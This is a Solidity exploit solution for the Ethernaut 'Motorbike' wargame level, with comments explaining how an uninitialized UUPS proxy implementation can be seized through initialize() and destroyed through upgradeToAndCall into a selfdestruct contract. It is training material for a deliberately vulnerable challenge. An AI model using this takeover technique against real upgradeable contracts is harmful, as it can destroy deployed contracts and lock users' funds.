// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 25. MOTORBIKE
 * @dev Selfdestruct the Engine contract and make the Motorbike contract unusable.
 */

interface IEngine {
    function upgrader() external view returns (address);

    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;
}

/*
In order to selfdestruct the Engine contract, we need to upgrade it to a new implementation since there is no
selfdestruct() in this one. We can call the upgradeToAndCall function for that, but we first need to become
the upgrader inside the Engine contract to pass the _authorizeUpgrade() check.

There is not way to do that by calling the Motorbike contract directly. But, we see that the Motorbike contract 
is using a delegatecall to initialize the Engine contract. This means that, as far as the Engine knows, the upgrader
hasn't been set yet (still address(0)), so we can call the initialize function from our exploit contract directly.
*/

/*
To get the current Engine implementation address, type this in your Ethernaut browser console:
await web3.eth.getStorageAt(instance, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc');
=> 0x000000000000000000000000239bcf976042946e51690c2de9fea5d017eb282c
=> 0x239bcf976042946e51690c2de9fea5d017eb282c
*/

contract Ethernaut_Motorbike {
    function attack(IEngine engine) public {
        // 1. Initialize the engine contract
        engine.initialize();
        // 2. Upgrade the engine contract to a new implementation and kill it
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destruct()")
        );
    }

    function destruct() public {
        selfdestruct(payable(address(0)));
    }
}

// LEVEL UNBEATABLE SINCE THE DENCUN UPGRADE - SEE EIP6780 | selfdestruct
